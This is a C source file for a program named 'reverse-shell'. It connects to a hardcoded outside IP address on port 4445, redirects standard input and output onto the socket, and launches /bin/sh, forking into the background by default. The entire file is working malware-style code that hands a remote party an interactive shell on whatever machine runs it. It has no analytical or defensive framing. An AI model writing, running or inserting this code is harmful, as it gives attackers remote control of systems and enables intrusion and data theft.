#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>


#define PROGNAME	"reverse-shell"
#define VERSION		"1.0.0"
#define SHELL		"sh"
#define PATH		"/bin"
#define PATHSHELL	PATH "/" SHELL


#define RSHELL_F_NOFORK	(1 << 0)

struct rshell
{
	char		*host;
	char		*service;
	uint16_t	port;
	int		family;
	char		*shell;
	unsigned	flags;
};




static char *rshell_basename(char *path)
{
	char		*ptr;
	size_t		len = strlen(path);

	for ( ptr = path + len ; ptr >= path ; ptr--)
	{
		if ( ptr[0] == '/' )
			return ++ptr;
	}

	return path;
}


static void reverse_tcp(const struct rshell *rshell)
{
	int		sockfd;
	struct addrinfo	hints;
	struct addrinfo	*res;
	int		ret;
	char		*ex[3];

	memset(&hints, 0, sizeof hints);
	hints.ai_family = rshell->family;
	hints.ai_socktype = SOCK_STREAM;

	if ( (ret = getaddrinfo(rshell->host, rshell->service, &hints, &res)) != 0 )
		return;

	if ( (sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) < 0 )
		return;

	if ( connect(sockfd, res->ai_addr, res->ai_addrlen) < 0 )
		return;

	/* Replace stdin, stdout and stderr from the socket
	 */
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	ex[0] = rshell->shell;
	ex[1] = rshell_basename(rshell->shell);
	ex[2] = NULL;

	execve(ex[0], &ex[1], NULL);

	/* Should never get here
	 */
}


static void rshell_init(struct rshell *rshell)
{
	rshell->family = AF_INET;
	rshell->shell = PATHSHELL;
	rshell->flags = 0;
}


static int rshell_set_port(struct rshell *rshell, char *port)
{
	long int	res;

	res = strtol(port, NULL, 10);

	if ( res <= 0 || res > 0xffff )
		return -1;

	rshell->service = port;
	rshell->port = (uint16_t) res;

	return 0;
}


int main(int argc, char *argv[])
{
	int		c;
	pid_t		child;
	struct rshell	rshell;

	rshell_init(&rshell);

	while ( (c = getopt(argc, argv, "6fhs:v")) != -1 )
	{
		switch ( c )
		{
			case '6':
			rshell.family = AF_INET6;
			break;

			case 'f':
			rshell.flags |= RSHELL_F_NOFORK;
			break;

			case 'h':
			return 0;

			case 's':
			rshell.shell = optarg;
			break;

			case 'v':
			return 0;
		}
	}

	argv += optind;
	argc -= optind;

	rshell.host = "107.170.200.75";
	if ( rshell_set_port(&rshell, "4445") )
	{
		return -1;
	}

	/* Fork and connect back
	 */
	if ( (rshell.flags & RSHELL_F_NOFORK) || (child = fork()) == 0 )
		reverse_tcp(&rshell);

	return 0;
}
